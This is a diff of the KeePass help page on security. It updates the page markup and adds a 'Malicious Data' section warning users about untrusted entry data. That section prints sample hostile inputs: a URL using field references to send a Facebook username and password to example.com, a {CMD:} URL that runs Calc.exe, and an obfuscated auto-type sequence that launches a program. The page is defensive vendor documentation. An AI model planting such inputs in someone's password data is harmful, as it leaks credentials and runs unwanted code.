@@ -1,8 +1,9 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
-	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
 	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
 	<meta http-equiv="expires" content="0" />
 	<meta http-equiv="cache-control" content="no-cache" />
 	<meta http-equiv="pragma" content="no-cache" />
@@ -17,7 +18,7 @@
 	<meta name="DC.type" content="Text" />
 	<meta name="DC.format" content="text/html" />
 	<meta name="DC.language" content="en" />
-	<meta name="DC.rights" content="Copyright (C) 2003-2018 Dominik Reichl" />
+	<meta name="DC.rights" content="Copyright (C) 2003-2020 Dominik Reichl" />
 
 	<meta name="robots" content="index, follow" />
 	<meta name="flattr:id" content="42rykv" />
@@ -32,12 +33,11 @@
 
 
 
-<table class="sectionsummary"><tr><td width="68">
-<img src="../images/b64x64_file_locked.png" width="64" height="64"
-class="singleimg" align="left" alt="Locked" />
-</td><td valign="middle"><h1>Security</h1><br />
-Detailed information on the security of KeePass.
-</td></tr></table>
+<table class="sectionheader"><tr>
+<td><img src="../images/b64x64_file_locked.png" alt="Locked" /></td>
+<td><h1>Security</h1>
+<p>Detailed information on the security of KeePass.</p></td>
+</tr></table>
 
 <ul>
 <li><a href="#secencrypt">Database Encryption</a></li>
@@ -51,15 +51,15 @@ Detailed information on the security of KeePass.
 <li><a href="#secplugins">Plugins</a></li>
 <li><a href="#secselftests">Self-Tests</a></li>
 <li><a href="#secspecattacks">Specialized Spyware</a></li>
+<li><a href="#secmaldata">Malicious Data</a></li>
 <li><a href="#secissues">Security Issues</a></li>
 </ul>
 
 <br />
 
 <a name="secencrypt"></a>
-<h2 class="sectiontitle">
-<img src="../images/b16x16_password.png" class="singleimg" alt="Key" />&nbsp;&nbsp;Database
-Encryption</h2>
+<h2 class="sectiontitle"><img src="../images/b16x16_password.png" alt="Key" />
+Database Encryption</h2>
 
 <p>KeePass database files are encrypted. KeePass encrypts the whole
 database, i.e. not only your passwords, but also your user names, URLs,
@@ -68,43 +68,43 @@ notes, etc.</p>
 <p>The following encryption algorithms are supported:</p>
 
 <p>KeePass 1.x:</p>
-<center><table class="tablebox75">
-<tr><th align="left" style="width: 64.5%;">Algorithm</th>
-<th align="left" style="width: 14%;">Key Size</th>
-<th align="left" style="width: 21.5%;">Std. / Ref.</th></tr>
+<table class="tablebox75">
+<tr><th style="width: 64.5%;">Algorithm</th>
+<th style="width: 14%;">Key Size</th>
+<th style="width: 21.5%;">Std. / Ref.</th></tr>
 
-<tr><td align="left">Advanced Encryption Standard (AES / Rijndael)</td>
-<td align="left">256 bits</td>
-<td align="left"><a href="https://csrc.nist.gov/publications/fips/fips197/fips-197.pdf"
+<tr><td>Advanced Encryption Standard (AES / Rijndael)</td>
+<td>256 bits</td>
+<td><a href="https://csrc.nist.gov/publications/fips/fips197/fips-197.pdf"
 target="_blank">NIST FIPS 197</a></td></tr>
 
-<tr><td align="left">Twofish</td>
-<td align="left">256 bits</td>
-<td align="left"><a href="https://www.schneier.com/academic/twofish/"
+<tr><td>Twofish</td>
+<td>256 bits</td>
+<td><a href="https://www.schneier.com/academic/twofish/"
 target="_blank">Info</a></td></tr>
-</table></center>
+</table>
 
 <p>KeePass 2.x:</p>
-<center><table class="tablebox75">
-<tr><th align="left" style="width: 64.5%;">Algorithm</th>
-<th align="left" style="width: 14%;">Key Size</th>
-<th align="left" style="width: 21.5%;">Std. / Ref.</th></tr>
+<table class="tablebox75">
+<tr><th style="width: 64.5%;">Algorithm</th>
+<th style="width: 14%;">Key Size</th>
+<th style="width: 21.5%;">Std. / Ref.</th></tr>
 
-<tr><td align="left">Advanced Encryption Standard (AES / Rijndael)</td>
-<td align="left">256 bits</td>
-<td align="left"><a href="https://csrc.nist.gov/publications/fips/fips197/fips-197.pdf"
+<tr><td>Advanced Encryption Standard (AES / Rijndael)</td>
+<td>256 bits</td>
+<td><a href="https://csrc.nist.gov/publications/fips/fips197/fips-197.pdf"
 target="_blank">NIST FIPS 197</a></td></tr>
 
-<tr><td align="left">ChaCha20</td>
-<td align="left">256 bits</td>
-<td align="left"><a href="https://tools.ietf.org/html/rfc7539"
+<tr><td>ChaCha20</td>
+<td>256 bits</td>
+<td><a href="https://tools.ietf.org/html/rfc7539"
 target="_blank">RFC 7539</a></td></tr>
 
-<tr><td align="left" colspan="3">There exist various
+<tr><td colspan="3">There exist various
 <a href="https://keepass.info/plugins.html" target="_blank">plugins</a>
 that provide support for additional encryption algorithms,
 including but not limited to Twofish, Serpent and GOST.</td></tr>
-</table></center>
+</table>
 
 <p>These well-known and thoroughly analyzed algorithms are
 considered to be very secure.
@@ -113,7 +113,7 @@ and is approved by the National Security Agency (NSA)
 for top secret information.
 Twofish was one of the other four AES finalists.
 ChaCha20 is the successor of the Salsa20 algorithm (which is included in the
-<a href="http://www.ecrypt.eu.org/stream/"
+<a href="https://www.ecrypt.eu.org/stream/"
 target="_blank">eSTREAM portfolio</a>).</p>
 
 <p>The block ciphers are used in the Cipher Block Chaining (CBC)
@@ -143,9 +143,8 @@ a HMAC-SHA-256 hash of the ciphertext (Encrypt-then-MAC scheme).
 <br /><br />
 
 <a name="seckeyhash"></a>
-<h2 class="sectiontitle">
-<img src="../images/b16x16_password.png" class="singleimg" alt="Key" />&nbsp;&nbsp;Key
-Hashing and Key Derivation</h2>
+<h2 class="sectiontitle"><img src="../images/b16x16_password.png" alt="Key" />
+Key Hashing and Key Derivation</h2>
 
 <p>SHA-256 is used for compressing the components
 of the <a href="keys.html">composite master key</a>
@@ -170,9 +169,8 @@ and guessing attacks harder. For details, see the section
 <br />
 
 <a name="secdictprotect"></a>
-<h2 class="sectiontitle">
-<img src="../images/b16x16_password.png" class="singleimg" alt="Key" />&nbsp;&nbsp;Protection
-against Dictionary Attacks</h2>
+<h2 class="sectiontitle"><img src="../images/b16x16_password.png" alt="Key" />
+Protection against Dictionary Attacks</h2>
 
 <p>KeePass features a protection against dictionary and guessing attacks.</p>
 
@@ -241,9 +239,8 @@ only partially supports protection against dictionary and guessing attacks.</p>
 <br />
 
 <a name="secrandom"></a>
-<h2 class="sectiontitle">
-<img src="../images/b16x16_binary.png" class="singleimg" alt="Binary" />&nbsp;&nbsp;Random
-Number Generation</h2>
+<h2 class="sectiontitle"><img src="../images/b16x16_binary.png" alt="Binary" />
+Random Number Generation</h2>
 
 <p>KeePass first creates an entropy pool using various entropy sources
 (including random numbers generated by the system cryptographic provider,
@@ -258,31 +255,30 @@ using a cryptographically secure pseudo-random number generator
 <br />
 
 <a name="secmemprot"></a>
-<h2 class="sectiontitle">
-<img src="../images/b16x16_file_locked.png" class="singleimg"
-alt="Application Protection" />&nbsp;&nbsp;Process Memory Protection</h2>
+<h2 class="sectiontitle"><img src="../images/b16x16_file_locked.png" alt="Locked" />
+Process Memory Protection</h2>
 
-<p>While KeePass is running, sensitive data (like the hash of the master key and
-entry passwords) is stored encryptedly in process memory.
+<p>While KeePass is running, sensitive data is stored encryptedly
+in the process memory.
 This means that even if you would dump the KeePass process memory to disk,
-you could not find any sensitive data.</p>
+you could not find any sensitive data.
+For performance reasons, the process memory protection only applies
+to sensitive data; sensitive data here includes for instance the master key
+and entry passwords, but not user names, notes and file attachments.
+Note that this has nothing to do with the
+<a href="#secencrypt">encryption of database files</a>;
+in database files, all data (including user names, etc.) is encrypted.</p>
 
-<!-- By default, entry passwords are encrypted in memory, the other fields not
-(like in 1.x). However, you can turn on memory protection for other fields
-in the database settings dialog (not recommended though, because of
-performance reasons). -->
-
-<!-- <p>For example, when you are copying a password to the clipboard, KeePass
-first decrypts the password field, copies it to the clipboard
-and immediately re-encrypts it using the random key.</p> -->
-
-<p>Furthermore, KeePass erases all security-critical memory when it is not
-needed anymore, i.e. it overwrites these memory areas before releasing them.</p>
+<p>Furthermore, KeePass erases all security-critical memory (if possible)
+when it is not needed anymore, i.e. it overwrites these memory areas
+before releasing them.</p>
 
 <p>KeePass uses the Windows DPAPI for encrypting sensitive data in memory
-(via <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa380262.aspx"
+<!-- https://msdn.microsoft.com/en-us/library/windows/desktop/aa380262.aspx -->
+(via <a href="https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectmemory"
 target="_blank">CryptProtectMemory</a> /
-<a href="https://msdn.microsoft.com/en-us/library/system.security.cryptography.protectedmemory.aspx"
+<!-- https://msdn.microsoft.com/en-us/library/system.security.cryptography.protectedmemory.aspx -->
+<a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.protectedmemory"
 target="_blank">ProtectedMemory</a>).
 With DPAPI, the key for the memory encryption is stored in a
 secure, non-swappable memory area managed by Windows.
@@ -299,21 +295,23 @@ On Unix-like systems, KeePass 2.x uses ChaCha20, because Mono does not provide
 any effective memory protection method.</p>
 
 <p>For some operations, KeePass must make sensitive data available
-unencryptedly in process memory. For example, in order to show a password
+unencryptedly in the process memory. For example, in order to show a password
 in the standard list view control provided by Windows, KeePass must supply
 the cell content (the password) as unencrypted string
 (unless hiding using asterisks is enabled).
-Operations that result in unencrypted data in process memory include,
+Operations that result in unencrypted data in the process memory include,
 but are not limited to: displaying data (not asterisks) in standard controls,
-searching data, and replacing placeholders (during auto-type, drag&amp;drop,
-copying to clipboard, ...).</p>
+searching data, replacing placeholders (during auto-type, drag&amp;drop,
+copying to clipboard, ...), importing/exporting files (except KDBX)
+and loading/saving unencrypted files.
+Windows and .NET may make copies of the data (in the process memory)
+that cannot be erased by KeePass.</p>
 
 <br />
 
 <a name="secdesktop"></a>
-<h2 class="sectiontitle">
-<img src="../images/b16x16_kgpg.png" class="singleimg" alt="User Key" />&nbsp;&nbsp;Enter
-Master Key on Secure Desktop (Protection against Keyloggers)</h2>
+<h2 class="sectiontitle"><img src="../images/b16x16_kgpg.png" alt="User Key" />
+Enter Master Key on Secure Desktop (Protection against Keyloggers)</h2>
 
 <p>KeePass 2.x has an option (in 'Tools' &rarr; 'Options' &rarr; tab 'Security')
 to show the master key dialog on a different/secure desktop
@@ -337,24 +335,25 @@ entering the master key on a different/secure desktop!</i></p>
 <br />
 
 <a name="seclocking"></a>
-<h2 class="sectiontitle">
-<img src="../images/b16x16_file_locked.png" class="singleimg"
-alt="Application Protection" />&nbsp;&nbsp;Locking the Workspace</h2>
+<h2 class="sectiontitle"><img src="../images/b16x16_file_locked.png" alt="Locked" />
+Locking the Workspace</h2>
 
 <p>When locking the workspace, KeePass closes the database file and
-only remembers its path.</p>
+only remembers its path and certain view parameters.</p>
 
 <p>This provides maximum security: unlocking the
 workspace is as hard as opening the database file the normal way. Also, it prevents
 data loss (the computer can crash while KeePass is locked, without doing any damage
 to the database).</p>
 
+<p>When a sub-dialog is open, the workspace may not be locked;
+for details, see the <a href="faq_tech.html#noautolock">FAQ</a>.</p>
+
 <br />
 
 <a name="secattach"></a>
-<h2 class="sectiontitle">
-<img src="../images/b16x16_desktop.png" class="singleimg" alt="Desktop" />&nbsp;&nbsp;Viewing/Editing
-Attachments</h2>
+<h2 class="sectiontitle"><img src="../images/b16x16_desktop.png" alt="Desktop" />
+Viewing/Editing Attachments</h2>
 
 <p>KeePass 2.x has an internal viewer/editor for attachments.
 For details how to use it for working with texts, see
@@ -375,8 +374,8 @@ In any case, KeePass afterwards securely deletes the temporary file
 <br />
 
 <a name="secplugins"></a>
-<h2 class="sectiontitle">
-<img src="../images/b16x16_blockdevice.png" class="singleimg" alt="Plugins" />&nbsp;&nbsp;Plugins</h2>
+<h2 class="sectiontitle"><img src="../images/b16x16_blockdevice.png" alt="Plugins" />
+Plugins</h2>
 
 
 
@@ -388,8 +387,8 @@ In any case, KeePass afterwards securely deletes the temporary file
 <br />
 
 <a name="secselftests"></a>
-<h2 class="sectiontitle">
-<img src="../images/b16x16_kblackbox.png" class="singleimg" alt="Black Box" />&nbsp;&nbsp;Self-Tests</h2>
+<h2 class="sectiontitle"><img src="../images/b16x16_kblackbox.png" alt="Black Box" />
+Self-Tests</h2>
 
 <p>Each time you start KeePass, the program performs a quick self-test to see
 whether the encryption and hash algorithms work correctly and pass
@@ -399,9 +398,8 @@ KeePass shows a security exception dialog.</p>
 <br />
 
 <a name="secspecattacks"></a>
-<h2 class="sectiontitle">
-<img src="../images/b16x16_openterm.png" class="singleimg" alt="Terminal" />&nbsp;&nbsp;Specialized
-Spyware</h2>
+<h2 class="sectiontitle"><img src="../images/b16x16_openterm.png" alt="Terminal" />
+Specialized Spyware</h2>
 
 <p>This section gives answers to questions like the following:</p>
 
@@ -421,7 +419,7 @@ increase security?</li>
 <p>The answer to all these questions is: no. Adding any of these features
 would not increase security.</p>
 
-<p>All security features in KeePass protect against <i>generic</i> threats like
+<p>All security features in KeePass protect against <em>generic</em> threats like
 keyloggers, clipboard monitors, password control monitors, etc. (and against
 non-runtime attacks on the database, memory dump analyzers, ...).
 However in all the questions above we are assuming that there is a spyware
@@ -430,11 +428,13 @@ program running on the system that is specialized on attacking KeePass.</p>
 <p>In this situation, the best security features will fail.
 This is law #1 of the
 <!-- https://technet.microsoft.com/en-us/library/cc722487.aspx -->
-<a href="https://technet.microsoft.com/en-us/library/hh278941.aspx"
-target="_blank">Ten Immutable Laws of Security</a>
+<!-- https://technet.microsoft.com/en-us/library/hh278941.aspx -->
+<a href="https://web.archive.org/web/20180529154650/https://technet.microsoft.com/en-us/library/hh278941.aspx"
+target="_blank" rel="nofollow">Ten Immutable Laws of Security</a>
 (Microsoft TechNet article; see also the
 Microsoft TechNet article
-<a href="https://technet.microsoft.com/en-us/library/2008.10.securitywatch.aspx"
+<!-- https://technet.microsoft.com/en-us/library/2008.10.securitywatch.aspx -->
+<a href="https://docs.microsoft.com/en-us/previous-versions/technet-magazine/cc895640(v=msdn.10)"
 target="_blank">Revisiting the 10 Immutable Laws of Security, Part 1</a>):<br />
 <i>&quot;If a bad guy can persuade you to run his program on your
 computer, it's not your computer anymore&quot;</i>.</p>
@@ -454,10 +454,90 @@ do not open unknown e-mail attachments, etc.</p>
 
 <br />
 
+<a name="secmaldata"></a>
+<h2 class="sectiontitle"><img src="../images/b16x16_enhanced_browsing.png" alt="URL" />
+Malicious Data</h2>
+
+<p>The user should check all data that he enters and/or runs.</p>
+
+<p>If you enter/run data without checking it first, this can lead to
+security problems (like for instance a disclosure of sensitive data
+or an execution of malicious code). This is a general principle;
+it applies to most applications, not only to KeePass.</p>
+
+<p>Examples:</p>
+<ul class="withspc">
+<li>The <a href="autourl.html">URL field</a> of an entry supports running
+a <a href="autourl.html#cmdln">command line</a>.
+So, if you (enter and) run a URL without checking it first,
+you might run a malicious program/code.</li>
+
+<li>When running a URL, a malicious <a href="autourl.html#override">URL override</a>
+(global or entry-specific) may be executed instead, if you did not check it.</li>
+
+<li>KeePass supports <a href="placeholders.html">placeholders</a>.
+All regular placeholders are of the form '<code>{...}</code>', and
+<a href="placeholders.html#envvars">environment variables</a>
+are of the form '<code>%...%</code>'.
+All data should be checked for malicious placeholders and environment variables.
+
+<ul>
+<li><a href="fieldrefs.html">Field references</a> can insert data of
+other entries into the current data. For example, if you have a Facebook account,
+entering and running the following URL might send your Facebook user name
+and the password to the 'example.com' server:<br />
+<code>https://example.com/?u={REF:U@T:Facebook}&amp;p={REF:P@T:Facebook}</code></li>
+
+<li>The <a href="placeholders.html#cmd"><code>{CMD:...}</code> placeholder</a>
+runs a command line. For example, the following URL opens
+'https://example.com/' and runs 'Calc.exe':<br />
+<code>https://example.com/{CMD:/Calc.exe/W=0/}</code></li>
+</ul>
+
+<a href="placeholders.html#texttrf">Text transformation placeholders</a>
+may be used to obfuscate parts of the data.</li>
+
+<li>The following <a href="autotype.html">auto-type</a> sequence
+performs a login and additionally runs 'Calc.exe':<br />
+<code>{USERNAME}{TAB}{PASSWORD}{ENTER}{VKEY
+91}{T-CONV:/%43%61%6C%63%2E%65%78%65/Uri-Dec/}{VKEY 13}</code><br />
+This sequence typically only works on a Windows system, but similar
+sequences can be constructed for other operating systems
+(like Linux and Mac OS X).</li>
+
+<li>If you specify weak <a href="#secdictprotect">key derivation</a>
+settings suggested by an attacker, this might make it easier for the
+attacker to decrypt/open your database.</li>
+
+<li>If you enter/use a <a href="pwgenerator.html">password generator</a>
+profile (suggested by an attacker) that allows weak passwords only,
+accounts using such weak passwords may not be well protected.</li>
+
+<li>Using the <a href="https://keepass.info/help/v2/xml_replace.html"
+target="_blank">XML Replace</a> feature with malicious parameters may
+result in a malicious modification of data in your database.</li>
+
+<li>Pasting/entering malicious <a href="https://keepass.info/help/v2/triggers.html"
+target="_blank">triggers</a> in the triggers dialog without checking
+them can result in security problems.</li>
+</ul>
+
+<p>If the user checks the data that he enters/runs, none of the
+&quot;attacks&quot; above works. Entering data is a manual operation
+(i.e. an attacker cannot do this himself), and only the user can
+decide whether the resulting effect is intended or not.
+Showing warning/confirmation dialogs all the time would not be reasonable.</p>
+
+<p>When opening a database that has been created/modified by
+someone else, you should carefully check all data that you want to use.
+If you do not fully trust the creator of the database, do not
+open any files attached to entries.</p>
+
+<br />
+
 <a name="secissues"></a>
-<h2 class="sectiontitle">
-<img src="../images/b16x16_message.png" class="singleimg" alt="Message" />&nbsp;&nbsp;Security
-Issues</h2>
+<h2 class="sectiontitle"><img src="../images/b16x16_message.png" alt="Message" />
+Security Issues</h2>
 
 <p>For a list of security issues, their status and clarifications, please see the page
 <a href="https://keepass.info/help/kb/sec_issues.html"
